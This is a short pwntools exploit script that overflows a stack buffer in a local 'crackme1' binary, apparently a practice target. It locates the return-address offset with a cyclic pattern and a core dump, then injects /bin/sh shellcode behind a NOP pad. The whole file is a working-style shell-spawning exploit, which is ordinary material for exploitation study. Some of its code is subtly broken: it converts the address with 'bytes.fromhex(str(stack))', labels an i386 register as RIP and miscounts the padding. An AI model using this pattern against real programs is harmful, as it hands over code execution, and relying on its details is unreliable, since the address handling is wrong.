from pwn import *

def exploit(pathname: str) -> None:

    # context definition
    context.arch    = 'i386'
    context.os      = 'linux'

    # crafting shellcode
    shellcode = shellcraft.sh()
    payload = asm(shellcode)

    # computing RIP offset
    crash = process(pathname)
    crash.sendline(cyclic(500))
    crash.wait()
    core = crash.corefile
    stack = core.esp
    print(type(stack))
    info("esp = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    info("rip offset is %d", rip_offset)

    # injecting payload
    proc = process(pathname)
    proc.sendline(payload + b'\x90'*(rip_offset - len(payload) - 1) + bytes.fromhex(str(stack)))


    return

if __name__ == '__main__':

    pathname = '../../src/crackme/crackme1'
    exploit(pathname)
